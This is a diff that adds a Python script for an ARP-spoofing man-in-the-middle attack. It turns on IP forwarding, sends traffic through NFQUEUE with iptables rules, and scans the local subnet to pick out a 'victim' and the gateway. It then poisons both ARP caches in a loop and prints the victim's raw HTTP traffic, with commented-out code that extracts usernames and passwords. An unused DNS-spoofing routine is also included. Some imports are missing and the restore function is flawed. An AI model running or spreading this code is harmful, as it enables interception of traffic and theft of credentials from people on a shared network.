@@ -1,0 +1,121 @@
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+import netifaces
+import sys
+import os
+from netfilterqueue import NetfilterQueue
+from uuid import getnode
+
+os.system("sysctl -w net.ipv4.ip_forward=1")
+os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
+os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
+os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+
+# get attacker's mac address
+h = hex(getnode())[2:11].zfill(12)
+spoof_mac = ":".join(i + j for i, j in zip(h[::2], h[1::2]))
+
+#f = open("scan_result", "r")
+
+vic = {'ip':'', 'mac':''}
+gtw = {'ip':'', 'mac':''}
+
+gateway = netifaces.gateways()['default'][netifaces.AF_INET]
+gtw_ip = gateway[0]
+iface = gateway[1]
+
+arp = scapy.ARP(pdst=gtw_ip + '/24')
+ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+
+result = scapy.srp(ether/arp, timeout=3, verbose=0)[0]
+
+# print all available device
+print("Available devices")
+print("-"*41)
+print("IP" + " "*20 + "MAC address")
+print("-"*41)
+
+for send, recv in result:
+    client = {'ip': recv.psrc, 'mac': recv.hwsrc}
+    if not re.match(r'(.*).1$', client['ip'], re.M) and not re.match(r'(.*).254$', client['ip'], re.M):
+        print("{:22}{}".format(client['ip'], client['mac']))
+        if recv.psrc == gtw_ip:
+            gtw = client
+            print("gateway: " + gtw['ip'], gtw['mac'])
+        else:
+            vic = client
+            print("victim: " + vic['ip'], vic['mac'])
+
+#for index, line in enumerate(f):
+#    print(line, end="")
+#    if index == 4:
+#        gtw['ip'], gtw['mac'] = line.split()
+#    elif index == 5:
+#        vic['ip'], vic['mac'] = line.split()
+
+#f.close()
+
+
+
+def spoofer(targetIP, spoofIP):
+    packet=scapy.ARP(op=2, pdst=targetIP, hwdst=spoof_mac, psrc=spoofIP)
+    scapy.send(packet,verbose=False)
+
+def restore(src, dst):
+    packet=scapy.ARP(op=2, pdst=dst['ip'], hwdst=dst['mac'], psrc=src['ip'], hwsrc=src['ip'])
+    scapy.send(packet,verbose=False)
+
+def dns_spoof(pkt):
+    scapy_pkt = scapy.IP(pkt.get_payload())
+    if(scapy_pkt.haslayer(scapy.DNSRR)):
+        qname = scapy_pkt[scapy.DNSQR].qname
+        #if qname is not null:
+        print("\n[+] Spoofing target", end="")
+        answer = scapy.DNSRR(rrname=qname, rdata=gtw['ip'])
+        scapy_pkt[scapy.DNS].an = answer
+        scapy_pkt[scapy.DNS].ancount = 1
+    pkt.accept()
+
+def get_user_info(pkt):
+    scapy_pkt = scapy.IP(pkt.get_payload())
+    
+    if(scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.src == vic['ip'] and scapy_pkt.dport == 80):
+        content = scapy_pkt.getlayer(scapy.Raw).load
+        print(content)
+        #http_content = "".join(str(scapy_pkt.getlayer(scapy.Raw).load))
+        #info = http_content.split('&')
+        #print(info)
+        #uname = info[0].split('=')[1]
+        #passwd = info[1].split('=')[1]
+        
+        print("\n===== GET USER INFO =====")
+        #print("username: " + uname + "\npassword: " + passwd)
+        print("=========================")
+
+    pkt.accept()
+
+pkt_cnt = 0
+
+nfqueue = NetfilterQueue()
+nfqueue.bind(0, get_user_info)
+
+try:
+    pid = os.fork()
+    if pid == 0:
+        #print("nf queue start")
+        nfqueue.run()
+    else:
+        #print("arp start")
+        while True:
+            spoofer(vic['ip'], gtw['ip'])
+            spoofer(gtw['ip'], vic['ip'])
+            pkt_cnt += 2
+            print("\r[+] Send packet: " + str(pkt_cnt), end=""),
+            time.sleep(2)
+except KeyboardInterrupt:
+    print("\nSpoofing stop...")
+    os.system("iptables --flush")
+    nfqueue.unbind()
+    restore(vic, gtw)
+    restore(gtw, vic)
